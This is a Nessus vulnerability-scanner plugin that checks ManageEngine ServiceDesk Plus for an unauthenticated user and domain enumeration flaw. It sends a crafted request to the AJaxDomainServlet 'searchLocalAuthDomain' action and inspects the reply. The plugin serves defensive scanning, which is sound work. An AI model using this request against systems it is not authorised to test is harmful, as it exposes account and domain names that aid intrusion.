#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(86444);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2016/04/28 18:52:11 $");

  script_osvdb_id(117583);
  script_xref(name:"EDB-ID", value:"35891");

  script_name(english:"ManageEngine ServiceDesk Plus User and Domain Enumeration");
  script_summary(english:"Attempts to exploit the issue.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by an information disclosure
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The installed version of ManageEngine ServiceDesk Plus running on the
remote web server is affected by an information disclosure
vulnerability due to a flaw in the /servlet/AJaxServlet script that is
triggered when handling a request involving the 'checkUser' or 
'searchLocalAuthDomain' actions. An unauthenticated, remote attacker
can exploit this, via repeated requests to AJaxDomainServlet, to
enumerate arbitrary user names and domains.");
  # http://www.rewterz.com/vulnerabilities/manageengine-servicedesk-plus-user-enumeration-vulnerability/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?d47cebf9");
  script_set_attribute(attribute:"see_also", value:"https://www.manageengine.com/products/service-desk/readme-9.0.html");
  script_set_attribute(attribute:"solution", value:
"Upgrade to ManageEngine ServiceDesk Plus version 9.0 build 9031 or
above and disable domain filtering for users.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/01/23");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/12/23");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/10/20");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:manageengine:servicedesk_plus");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015-2016 Tenable Network Security, Inc.");

  script_dependencies("manageengine_servicedesk_detect.nasl");
  script_require_keys("www/manageengine_servicedesk");
  script_require_ports("Services/www", 8080);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app_name = 'manageengine_servicedesk'; 
get_install_count(app_name:app_name, exit_if_zero:TRUE);

port = get_http_port(default:8080);
install = get_single_install(
  app_name : 'manageengine_servicedesk', 
  port     :  port
);

# administrator is built in and should respond with 'Not in a domain'
attack  = "domainServlet/AJaxDomainServlet?action=searchLocalAuthDomain&search=administrator";

dir = install['path'];
if(dir !~ "^.*/$")
  dir += "/";

res = http_send_recv3(
  port         : port,
  method       : "GET",
  item         : dir+attack,
  exit_on_fail : TRUE
);

# Patched server + configuration will always respond 'showAllDomains'
if(empty_or_null(res) || res[0] !~ "200 OK" || res[2] == 'showAllDomains')
  audit(AUDIT_WEB_APP_NOT_AFFECTED, 'ManageEngine ServiceDesk', build_url(qs:dir,port:port));

security_report_v4(
  port     : port,
  severity : SECURITY_WARNING,
  request  : make_list(build_url(port:port, qs:dir+attack)),
  output   : res[2],
  generic  : TRUE
);
